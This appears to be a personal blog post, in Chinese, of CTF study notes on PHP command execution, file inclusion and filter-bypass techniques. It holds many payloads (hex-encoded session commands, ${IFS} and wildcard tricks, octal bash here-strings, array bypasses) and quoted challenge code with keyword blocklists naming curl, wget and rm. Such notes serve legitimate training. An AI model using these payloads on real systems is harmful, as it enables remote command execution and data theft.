@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="[TOC] 一、命令执行函数CTF中命令执行常用知识点总结 - FreeBuf网络安全行业门户 CTF命令执行常用绕过方式_ctf 命令执行 空格绕过-CSDN博客 12345678system 函数：system 函数执行系统命令，并将输出直接打印到标准输出。它的返回值是命令的最后一行输出或者返回状态码（命令成功执行返回0）。shell_exec 函数：shell_exec 函数执行系统命令，但">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="[TOC] 一、命令执行函数CTF中命令执行常用知识点总结 - FreeBuf网络安全行业门户 CTF命令执行常用绕过方式_ctf 命令执行 空格绕过-CSDN博客 12345678system 函数：system 函数执行系统命令，并将输出直接打印到标准输出。它的返回值是命令的最后一行输出或者返回状态码（命令成功执行返回0）。shell_exec 函数：shell_exec 函数执行系统命令，但">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250913170647274.png">
+<meta property="og:image" content="http://example.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-24%20200443.png">
+<meta property="og:image" content="http://example.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250424200546514.png">
+<meta property="article:published_time" content="2025-03-14T12:02:38.067Z">
+<meta property="article:modified_time" content="2025-09-13T09:06:56.357Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20250913170647274.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  	<time datetime="2025-03-14T12:02:38.067Z" itemprop="datePublished">2025-03-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[TOC]</p>
+<h2 id="一、命令执行函数"><a href="#一、命令执行函数" class="headerlink" title="一、命令执行函数"></a>一、命令执行函数</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/319567.html">CTF中命令执行常用知识点总结 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_25953411/article/details/144148313">CTF命令执行常用绕过方式_ctf 命令执行 空格绕过-CSDN博客</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system 函数：system 函数执行系统命令，并将输出直接打印到标准输出。它的返回值是命令的最后一行输出或者返回状态码（命令成功执行返回0）。</span><br><span class="line"></span><br><span class="line">shell_exec 函数：shell_exec 函数执行系统命令，但它将命令的输出作为字符串返回，而不是打印到标准输出。如果命令没有输出，则返回空字符串。</span><br><span class="line"></span><br><span class="line">exec 函数：exec 函数执行系统命令，并将输出存储到一个数组中，每一行命令输出作为数组的一个元素。它的返回值是命令的最后一行输出或者返回状态码。</span><br><span class="line"></span><br><span class="line">passthru 函数：passthru 函数执行系统命令，并直接将命令的输出发送到标准输出。它不会返回任何输出结果，而是直接将输出显示在屏幕上。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>###1.shell_exec()</p>
+<p>无回显函数，需要有echo或print_r</p>
+<h3 id="2-显示文件"><a href="#2-显示文件" class="headerlink" title="2.显示文件"></a>2.显示文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=include &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=file_get_contents(&#x27;flag.php&#x27;);</span><br><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-var-dump"><a href="#3-var-dump" class="headerlink" title="3.var_dump()"></a>3.var_dump()</h3><p>print_r也可以使用var_dump表示</p>
+<p>还可以使用var_export()</p>
+<h3 id="4-exit"><a href="#4-exit" class="headerlink" title="4.exit()"></a>4.exit()</h3><p>结合 exit() 函数执行php代码让后面的匹配缓冲区不执行直接退出</p>
+<h3 id="5-open-basedir指令"><a href="#5-open-basedir指令" class="headerlink" title="5.open_basedir指令"></a>5.open_basedir指令</h3><p>open_basedir 是 PHP 的一个安全配置指令，用来限制 PHP 脚本只能访问特定的目录。</p>
+<h3 id="6-system-函数"><a href="#6-system-函数" class="headerlink" title="6.system()函数"></a>6.system()函数</h3><p>system下可以直接执行命令</p>
+<h3 id="7-eval-函数"><a href="#7-eval-函数" class="headerlink" title="7.eval()函数"></a>7.eval()函数</h3><p>eval()函数是代码执行</p>
+<p>system()函数是命令执行</p>
+<h3 id="8-parse-str-函数"><a href="#8-parse-str-函数" class="headerlink" title="8.parse_str()函数"></a>8.parse_str()函数</h3><p>parse_str() 函数把查询字符串解析到变量中</p>
+<p>**注释：**如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p>
+<p>@parse_str($id); 这个函数不会检查变量 $id 是否存在，如果通过其他方式传入数据给变量$id ,且当前$id中数据存在，它将会直接覆盖掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=a[0]=www.polarctf.com&amp;cmd=|cat `ls`;//回显之后直接点击源码便可得到flag</span><br><span class="line"> </span><br><span class="line">?id=a[]=www.polarctf.com&amp;cmd=|ls //发现有flag.php,但是不能直接读取</span><br><span class="line">?id=a[0]=www.polarctf.com&amp;cmd=;cat%20flag*</span><br><span class="line">或?id=a[0]=www.polarctf.com&amp;cmd=;cat%20fl&#x27;&#x27;ag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-环境变量env"><a href="#9-环境变量env" class="headerlink" title="9.环境变量env"></a>9.环境变量env</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1=system(&quot;env&quot;);</span><br><span class="line">system(&quot;env&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>###10.session_id（PHPSESSID）</p>
+<p>session_id（PHPSESSID）就是要执行的命令由于session格式限制，所以使用16进制加密后的命 令。</p>
+<h4 id="TGCTF-AAA偷渡阴平"><a href="#TGCTF-AAA偷渡阴平" class="headerlink" title="TGCTF AAA偷渡阴平"></a>TGCTF AAA偷渡阴平</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?tgctf2025=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?tgctf2025=session_start();system(hex2bin(session_id()));</span><br><span class="line"> PHPSESSID=636174202f666c6167      </span><br><span class="line"> //cat /flag的十六进</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?tgctf2025=session_start();system(hex2bin(session_id()));</span><br><span class="line"> PHPSESSID=636174202f666c6167      </span><br><span class="line"> //cat /flag的十六进</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?tgctf2025=system(implode(apache_request_headers()))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、文件包含"><a href="#二、文件包含" class="headerlink" title="二、文件包含"></a>二、文件包含</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=include%09$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里使用文件包含的原因是题目中过滤了括号，php中include是可以不带括号的函数</p>
+<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">PolarD&amp;N CTF</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__file__);</span><br><span class="line">error_reporting(0); </span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">$a=$_GET[&#x27;c&#x27;];</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    if(preg_match(&#x27;/flag|\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $a))&#123;</span><br><span class="line">        die(&quot;oh on!!!&quot;);&#125;</span><br><span class="line">    </span><br><span class="line">    else&#123;</span><br><span class="line">        eval(&quot;var_dump($$a);&quot;);&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接全局变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=GLOBALS</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-include"><a href="#1-include" class="headerlink" title="1.include()"></a>1.include()</h3><p>可以进行无括号包含</p>
+<p><strong>include会直接执行文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include(&quot;/flag.txt&quot;);</span><br><span class="line">c=require(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-短标签代替"><a href="#2-短标签代替" class="headerlink" title="2.短标签代替"></a>2.短标签代替</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=data:text/plain,&lt;?=`tac f*`?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3.重定向"></a>3.重定向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A || B 	A执行成功就不执行B，同理，A执行不成功就执行B</span><br><span class="line">A  |  B 	将A的执行结果传入B</span><br><span class="line">A &amp;&amp; B 	A成功执行后执行B，如果A不成功，那么B就不会被执行</span><br></pre></td></tr></table></figure>
+
+<p>Eg:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ?c=tac flag.php ||</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、绕过"><a href="#三、绕过" class="headerlink" title="三、绕过"></a>三、绕过</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15291426.html">RCE篇之命令执行中的各种绕过 - 学安全的小白 - 博客园</a></p>
+<h3 id="1-分号"><a href="#1-分号" class="headerlink" title="1.分号"></a>1.分号</h3><p>;可以用?&gt;代替，与前面形成闭合，这样就可以做到参数逃逸</p>
+<h3 id="2-空格"><a href="#2-空格" class="headerlink" title="2.空格"></a>2.空格</h3><h4 id="1-对于注释和结尾字符的我们此处只能利用构造一个-’-来闭合后面到-’-；对于空格，有较多的方法："><a href="#1-对于注释和结尾字符的我们此处只能利用构造一个-’-来闭合后面到-’-；对于空格，有较多的方法：" class="headerlink" title="1.对于注释和结尾字符的我们此处只能利用构造一个 ’ 来闭合后面到 ’ ；对于空格，有较多的方法："></a>1.对于<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B3%A8%E9%87%8A&spm=1001.2101.3001.7020">注释</a>和结尾字符的我们此处只能利用构造一个 ’ 来闭合后面到 ’ ；对于空格，有较多的方法：</h4><p>%09   TAB 键（水平）<br>%0a   新建一行<br>%0c   新的一页<br>%0d   return 功能<br>%0b   TAB 键（垂直）<br>%a0   空格</p>
+<p>####2.用&lt;或&gt;代替</p>
+<p>但是&lt;不能和?连用</p>
+<h3 id="3-flag"><a href="#3-flag" class="headerlink" title="3.flag"></a>3.flag</h3><h4 id="1"><a href="#1" class="headerlink" title="(1).*"></a>(1).*</h4><h4 id="2"><a href="#2" class="headerlink" title="(2).?"></a>(2).?</h4><h4 id="3-’’或者”“"><a href="#3-’’或者”“" class="headerlink" title="(3).’’或者”“"></a>(3).’’或者”“</h4><h4 id="4"><a href="#4" class="headerlink" title="(4).\"></a>(4).\</h4><h4 id="5-’’"><a href="#5-’’" class="headerlink" title="(5).’’"></a>(5).’’</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">J=c&#x27;&#x27;at /f14g   #&#x27;&#x27;在bash中会被解释为空字符串，当flag被禁时也可以用</span><br></pre></td></tr></table></figure>
+
+<h4 id="6"><a href="#6" class="headerlink" title="(6)."></a>(6).</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">J=ls</span><br><span class="line">J=strings /f14g  #strings会提取文件中的可打印字符</span><br><span class="line">J=ca\t /f14g     #反斜杠绕过</span><br><span class="line">J=grep &#123; /f14g  #grep是用来查找字符串的，在这里我们查找&#123;他会输出含有&#123;的那一行</span><br><span class="line">J=c&#x27;&#x27;at /f14g   #&#x27;&#x27;在bash中会被解释为空字符串，当flag被禁时也可以用</span><br><span class="line">J=cp /f14g /var/www/html/index.php  #将/f14g的内容拷贝到index.php，index.php的内容会被覆盖</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="7-文件名被过滤"><a href="#7-文件名被过滤" class="headerlink" title="(7)文件名被过滤"></a>(7)文件名被过滤</h4><p>比如过滤了flag双写为flflagag</p>
+<h3 id="4-cat-tac-nl-more"><a href="#4-cat-tac-nl-more" class="headerlink" title="4.cat&#x2F;tac&#x2F;nl&#x2F;more"></a>4.cat&#x2F;tac&#x2F;nl&#x2F;more</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;more [d-h][k-m][9-z][e-h]</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容 more filename</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页 less filename</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br><span class="line">(13)cp:命令主要用于复制文件或目录。</span><br><span class="line">(14)mv:命令用来为文件或目录改名、或将文件或目录移入其它位置。</span><br><span class="line">mv [options] source dest</span><br><span class="line">mv [options] source... directory</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>nl命令要ctrl+c查看源代码才能获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里把几乎所有的东西都过滤了一遍，而且flag不能再使用反斜杠，单双引号绕过，通配符*也不能用了，但是还可以使用通配符？</p>
+<p>这里可以使用uniq命令（uniq 可检查文本文件中重复出现的行列or用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用。）</p>
+<p>也可以使用rev命令，但事实反向输出，整个字符串都逆序了（与tac的反向不同，tac的反向是先输出最后一行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=uniq$&#123;IFS&#125;f???.php</span><br><span class="line">/bin/?at$&#123;IFS&#125;f???????</span><br><span class="line">?emo=tail%09??a?.txt</span><br></pre></td></tr></table></figure>
+
+<p>cat命令所在的路径是再&#x2F;bin&#x2F;目录ixa，所以这里相当于直接调用了cat文件执行命令，这里的擦头可以看作命令，也是一个文件，所以通配符可以用在上面</p>
+<p>Linux 的很多命令存放在 &#x2F;bin&#x2F; 目录下，且可以通过绝对路径来使用，而且支持通配符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如cat命令也可这样使用：/bin/?at</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-uniq.html">bin目录下的命令</a></p>
+<h5 id="eg"><a href="#eg" class="headerlink" title="eg."></a>eg.</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line"></span><br><span class="line">#一句话木马，神神又奇奇</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;J&#x27;]))&#123;</span><br><span class="line">    $call=$_POST[&#x27;J&#x27;];</span><br><span class="line">    $dangerous_commands = [&#x27;cat&#x27;, &#x27;tac&#x27;, &#x27;head&#x27;, &#x27;nl&#x27;, &#x27;more&#x27;, &#x27;less&#x27;, &#x27;tail&#x27;, &#x27;vi&#x27;, &#x27;sed&#x27;, &#x27;od&#x27;];</span><br><span class="line">    foreach ($dangerous_commands as $command) &#123;</span><br><span class="line">        if (preg_match(&quot;/$command/i&quot;, $call)) &#123;</span><br><span class="line">            die(&quot;这些个危险函数可不兴使啊&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system($call);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行的函数都被绕过</p>
+<p>可以用strings 或者 grep进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">J=strings /f14g  #strings会提取文件中的可打印字符</span><br><span class="line">J=grep &#123; /f14g  #grep是用来查找字符串的，在这里我们查找&#123;他会输出含有&#123;的那一行</span><br></pre></td></tr></table></figure>
+
+<p>###5.</p>
+<p>赋值运算符&#x3D;的优先级高于逻辑运算符</p>
+<h3 id="6-八进制绕过"><a href="#6-八进制绕过" class="headerlink" title="6.八进制绕过"></a>6.八进制绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command [args] &lt;&lt;&lt;[&quot;]$word[&quot;]</span><br><span class="line">bash&lt;&lt;&lt;&#123;cat,/f*&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用探姬的工具bashfuck</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function waf($cmd)&#123;</span><br><span class="line">    $white_list = [&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;\\&#x27;,&#x27;\&#x27;&#x27;,&#x27;$&#x27;,&#x27;&lt;&#x27;]; </span><br><span class="line">    $cmd_char = str_split($cmd);</span><br><span class="line">    foreach($cmd_char as $char)&#123;</span><br><span class="line">        if (!in_array($char, $white_list))&#123;</span><br><span class="line">            die(&quot;really ez?&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $cmd;</span><br><span class="line">&#125;</span><br><span class="line">$cmd=waf($_GET[&quot;cmd&quot;]);</span><br><span class="line">system($cmd);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>
+
+<p><strong>wp:</strong> </p>
+<p>通过<code>bash&lt;&lt;&lt;&#123;cat,/f*&#125;</code>将 命令两次管道解析保证命令可以直接执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash  $&#x27;\142\141\163\150&#x27;</span><br><span class="line">&#123;cat,/f*&#125; $&#x27;\173\143\141\164\54\57\146\52\175&#x27;</span><br><span class="line">$&#x27;\142\141\163\150&#x27;&lt;&lt;&lt;$&#x27;\173\143\141\164\54\57\146\52\175&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第一次,解析shell为<code>bash&lt;&lt;&#123;cat,/f*&#125;</code> 第二次,将<code>&#123;cat,/f*&#125;</code>传递给bash正确解析</p>
+<p><strong>bash中的一种特殊的语法Here String，用于将字符串作为命令的标准输入提供给命令。它的语法形式是 &lt;&lt;&lt;，后跟一个字符串，形如：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command &lt;&lt;&lt; &quot;string&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的 command 可以是任何接受标准输入的命令，而 string 则是要提供给该命令的字符串。</p>
+<h3 id="7-过滤数字（使用数组）"><a href="#7-过滤数字（使用数组）" class="headerlink" title="7.过滤数字（使用数组）"></a>7.过滤数字（使用数组）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_REQUEST[&#x27;Number&#x27;])) &#123;</span><br><span class="line">    $inputNumber = $_REQUEST[&#x27;Number&#x27;];</span><br><span class="line">    </span><br><span class="line">    if (preg_match(&#x27;/\d/&#x27;, $inputNumber)) &#123;</span><br><span class="line">        die(&quot;不行不行,不能这样&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (intval($inputNumber)) &#123;</span><br><span class="line">        echo &quot;OK,接下来你知道该怎么做吗&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过 <code>Number</code> 参数限制</strong>：</p>
+<ul>
+<li>要求：<code>Number</code> 不能包含任何数字（<code>\d</code> 正则匹配失败），但 <code>intval($inputNumber)</code> 必须为真（非零）。</li>
+<li>方法：传递数组 <code>Number[]</code>。数组在正则匹配时返回 <code>false</code>（绕过数字检查），非空数组的 <code>intval()</code> 值为 <code>1</code>（满足条件）</li>
+</ul>
